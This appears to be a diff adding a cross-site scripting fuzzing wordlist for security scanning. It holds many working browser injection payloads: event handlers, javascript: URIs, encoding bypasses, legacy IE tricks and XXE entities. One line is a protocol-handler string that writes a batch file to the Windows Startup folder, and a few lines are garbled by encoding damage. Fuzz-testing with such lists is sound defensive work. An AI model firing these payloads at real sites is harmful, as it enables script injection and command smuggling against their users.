@@ -1,0 +1,166 @@
+# Sentinel Cross-Site Scripting Wordlist
+# Format: one payload per line. Comment lines begin with #.
+# Benign markers only; no credential theft, no persistence.
+
+# Basic script-context markers
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<SCRIPT>alert(1)</SCRIPT>
+<script src=//example.com/x.js></script>
+
+# Attribute-context markers
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+" autofocus onfocus="alert(1)
+' autofocus onfocus='alert(1)
+" onerror="alert(1)
+' onerror='alert(1)
+
+# Tag and protocol variants
+<svg/onload=alert(1)>
+<svg onload=alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+<math><mtext><script>alert(1)</script></mtext></math>
+<body onload=alert(1)>
+<img src=x onerror=alert(1)>
+<image src=x onerror=alert(1)>
+<video><source onerror="alert(1)">
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<a href="javascript:alert(1)">x</a>
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+
+# Obfuscation and encoding markers
+<scr<script>ipt>alert(1)</script>
+<script>alert(1)//
+<Img SrC=x OnErRoR=alert(1)>
+<svg><script>alert&#40;1&#41;</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+%3Cscript%3Ealert(1)%3C/script%3E
+%253Cscript%253Ealert(1)%253C/script%253E
+\u003cscript\u003ealert(1)\u003c/script\u003e
+
+# SecLists Fuzzing XSS collections (danielmiessler/SecLists, CC-BY-4.0)
+
+<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
+<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
+0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))
+<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
+<script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>
+<input onfocus=write(1) autofocus>
+<input onblur=write(1) autofocus><input autofocus>
+<a style="-o-link:'javascript:alert(1)';-o-link-source:current">X</a>
+<video poster=javascript:alert(1)//></video>
+<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg>
+<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>
+<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>
+<script>({0:#0=alert/#0#/#0#(0)})</script>
+X<x style=`behavior:url(#default#time2)` onbegin=`write(1)` >
+<?xml-stylesheet href="javascript:alert(1)"?><root/>
+<script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>
+<meta charset="x-mac-farsi">Â¼script Â¾alert(1)//Â¼/script Â¾
+<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
+<input onblur=focus() autofocus><input>
+<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>X</button>
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(1)&gt;`>
+<script src="#">{alert(1)}</script>;1
++ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);
+<style>p[foo=bar{}*{-o-link:'javascript:alert(1)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>
+1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(1)&gt;>
+<link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d
+<style>@import "data:,*%7bx:expression(write(1))%7D";</style>
+<frameset onload=alert(1)>
+<table background="javascript:alert(1)"></table>
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(2)">XXX</a>
+1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>
+1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XXX</a>
+<!--<img src="--><img src=x onerror=alert(1)//">
+<comment><img src="</comment><img src=x onerror=alert(1)//">
+<style><img src="</style><img src=x onerror=alert(1)//">
+<li style=list-style:url() onerror=alert(1)></li><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div>
+<head><base href="javascript://"/></head><body><a href="/. /,alert(1)//#">XXX</a></body>
+<style>*[{}@import'test.css?]{color: green;}</style>X
+<div style="font-family:'foo[a];color:red;';">XXX</div>
+<div style="font-family:foo}color=red;">XXX</div>
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+<SCRIPT FOR=document EVENT=onreadystatechange>alert(1)</SCRIPT>
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>
+<x style="behavior:url(test.sct)">
+<xml id="xss" src="test.htc"></xml><label dataformatas="html" datasrc="#xss" datafld="payload"></label>
+<script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>
+<video onerror="alert(1)"><source></source></video>
+<b <script>alert(1)//</script>0</script></b>
+<b><script<b></b><alert(1)</script </b></b>
+<div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
+<div style="[a]color[b]:[c]red">XXX</div>
+<div  style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div>
+<!-- IE 6-8 --><x '="foo"><x foo='><img src=x onerror=alert(1)//'><!-- IE 6-9 --><! '="foo"><x foo='><img src=x onerror=alert(2)//'><? '="foo"><x foo='><img src=x onerror=alert(3)//'>
+<!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>
+<svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>
+<!DOCTYPE x [	<!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x" onerror CDATA "alert(1)" onload CDATA "alert(2)">]><img />
+<doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">	<html:style /><x xlink:href="javascript:alert(1)" xlink:type="simple">XXX</x></doc>
+<card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(1)"/></onevent><timer value="1"/></card>
+<div style=width:1px;filter:glow onfilterchange=alert(1)>x</div>
+<// style=x:expression\28write(1)\29>
+<form><button formaction="javascript:alert(1)">X</button>
+<event-source src="event.php" onload="alert(1)">
+<a href="javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>
+<script<{alert(1)}/></script </>
+<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>
+<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>
+<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>
+<object allowscriptaccess="always" data="test.swf"></object>
+<style>*{x:ï½
+ï½ï½ï½ï½
+ï½ï½ï½ï½ï½(write(1))}</style>
+<x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(1)" xlink:type="simple"/>
+<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>
+<x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)"><x:timer value="1"/></x:template>
+<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(1)//#x"/>
+<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>
+<body oninput=alert(1)><input autofocus>
+<svg xmlns="http://www.w3.org/2000/svg"><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="1000" height="1000" fill="white"/></a></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><set attributeName="onmouseover" to="alert(1)"/><animate attributeName="onunload" to="alert(1)"/></svg>
+<!-- Up to Opera 10.63 --><div style=content:url(test2.svg)></div><!-- Up to Opera 11.64 - see link below --><!-- Up to Opera 12.x --><div style="background:url(test5.svg)">PRESS ENTER</div>
+<div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>
+<div style="list-style:url(http://foo.f)\20url(javascript:alert(1));">X</div>
+<svg xmlns="http://www.w3.org/2000/svg"><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>
+<iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe><iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>
+<div id=d><div style="font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'">X</div></div><script>with(document.getElementById("d"))innerHTML=innerHTML</script>
+XXX<style>*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */<!----><!--*{color:red}   /* all UA */*{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */</style>
+<img[a][b]src=x[d]onerror[c]=[e]"alert(1)">
+<a href="[a]java[b]script[c]:alert(1)">XXX</a>
+<img src="x` `<script>alert(1)</script>"` `>
+<script>history.pushState(0,0,'/i/am/somewhere_else');</script>
+<img src onerror /" '"= alt=alert(1)//">
+<title onpropertychange=alert(1)></title><title title=></title>
+<svg xmlns="http://www.w3.org/2000/svg"><path d="M0,0" style="marker-start:url(test4.svg#a)"/></svg>
+<div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>
+<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>
+<div id="x">XXX</div><style>#x{font-family:foo[bar;color:green;}#y];color:red;{}</style>
+<x style="background:url('x[a];color:red;/*')">XXX</x>
+<!--[if]><script>alert(1)</script --><!--[if<img src=x onerror=alert(2)//]> -->
+<a href="http://attacker.org">	<iframe src="http://example.org/"></iframe></a>
+<div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');">	<h1>Drop me</h1></div><iframe src="http://www.example.org/dropHere.html"></iframe>
+<iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe><textarea type="text" cols="50" rows="10"></textarea>
+<script>function makePopups(){	for (i=1;i<6;i++) {		window.open('popup.html','spam'+i,'width=50,height=50');	}}</script><body><a href="#" onclick="makePopups()">Spam</a>
+<iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>
+<script src="/\example.com\foo.js"></script> // Safari 5.0, Chrome 9, 10<script src="\\example.com\foo.js"></script> // Safari 5.0
+<svg xmlns="http://www.w3.org/2000/svg" id="x"><listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/><handler id="y">alert(1)</handler></svg>
+<svg><style>&lt;img/src=x onerror=alert(1)// </b>
+<svg><image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(1)</script></svg>")'><!--Same effect with<image filter='...'>--></svg>
+<!-- `<img/src=xx:xx onerror=alert(1)//--!>
+<xmp><%</xmp><img alt='%></xmp><img src=xx:x onerror=alert(1)//'><script>x='<%'</script> %>/alert(2)</script>XXX<style>*['<!--']{}</style>-->{}*{color:red}</style>
+aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"
+firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
+res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210
